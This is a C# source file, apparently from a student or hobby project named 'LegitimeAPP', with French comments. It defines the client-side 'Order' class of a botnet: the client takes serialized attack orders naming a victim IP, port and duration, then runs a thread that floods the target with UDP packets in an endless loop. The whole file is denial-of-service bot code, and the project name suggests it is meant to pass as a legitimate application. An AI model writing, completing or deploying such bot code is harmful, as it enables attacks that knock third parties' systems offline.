using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Xml;
using System.Xml.Serialization;

using LegitimeAPP.Shared;
using LegitimeAPP.Network;


/*

CLIENTSIDE ORDER CLASS

*/

namespace LegitimeAPP.Shared
{
    public class Order
    {

        [XmlElement("type_action")]
        public TypeAction action ;

        [XmlElement("port")]
        public int Port;
        [XmlElement("victimIP")]
        public string VictimIP;
        
        [XmlElement("nbSecond")]
        public int nbSecond;

        [XmlIgnore]
        public int speed;

        [XmlIgnore]
        Thread executingThis;

        [XmlIgnore]
        private static System.Timers.Timer Timer;


        // Evenement 

        public event EventConnectionHandler NewAttackOrder;
        public event EventConnectionHandler EndAttackOrder;


        public void OnNewAttackOrder() {
            NewAttackOrder?.Invoke();
        } 
        public void OnEndAttackOrder() {
            EndAttackOrder?.Invoke();
        }



        // Pour la serialization
        public Order() { }

        // Constructeur pour indiquer un état 
        public Order(TypeAction action) {
            this.action = action ;
        }

        // Constructeur pour ordonner une attaque 
        public Order(int Port, string VictimIP, int nbSecond, int speed = 250, TypeAction action = TypeAction.ATTACK)
        {
            this.action = TypeAction.ATTACK ; 
            this.Port = Port;
            this.VictimIP = VictimIP;
            this.nbSecond = nbSecond;
            this.speed = speed;


        }

        // DEMARRE L'ATTAQUE

        public void Start()
        {

           
                // Initialise le Thread 
                executingThis = new Thread(Exec);
                executingThis.Name = "Executing Order";


            Console.WriteLine("Le nombre de seconde est de "+nbSecond) ; 
                

                OnNewAttackOrder();

            Timer = new System.Timers.Timer(nbSecond * 1000)
            {
                AutoReset = false,
                Enabled = true, 
            };

            Console.WriteLine("The application started at {0:HH:mm:ss.fff}", DateTime.Now);


            Timer.Elapsed += delegate
                {

                    if (executingThis != null && executingThis.IsAlive)
                    {

                        Console.WriteLine("The Elapsed event was raised at {0:HH:mm:ss.fff}",
                          DateTime.Now);
                        OnEndAttackOrder();
                       // WriteNetMessage(Data<Order>.DataToXml(new Order(TypeAction.WAIT))) ; 
                        Timer.Dispose() ; 
                        executingThis = new Thread(Exec);
                    }
                };

                // Démarrage du timer et de l'attaque
                Timer.Start();
                executingThis.Start();
           
        }



        // ARRÊTE L'ATTAQUE EN COURS 
        private void Stop()
        {

        }

        // PERMET DE CHANGER DE CIBLE 
        public void Change(int Port, string VictimIP, int nbSecond, int speed = 250)
        {

            this.Port = Port;
            this.VictimIP = VictimIP;
            this.nbSecond = nbSecond;
            this.speed = speed;
        }



        public void Change(Order order)
        {

            
            Port = order.Port;
            VictimIP = order.VictimIP;
            nbSecond = order.nbSecond;

        }


        /* 
        PERMET D'ATTAQUER LA CIBLE
        entre-autre lui envoyer plein de data inutile
        */
        private void Exec()
        {
            byte[] data = ASCIIEncoding.ASCII.GetBytes("0123456789");

            Socket target = new(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            IPEndPoint ep = new(IPAddress.Parse(this.VictimIP), this.Port);


            while (true)
            {

                // Console.WriteLine("On attaque ! ") ; 

                target.SendTo(data, ep);

                // attente avant chaque envoie 
                Thread.Sleep(this.speed);
            }
        }
    }
}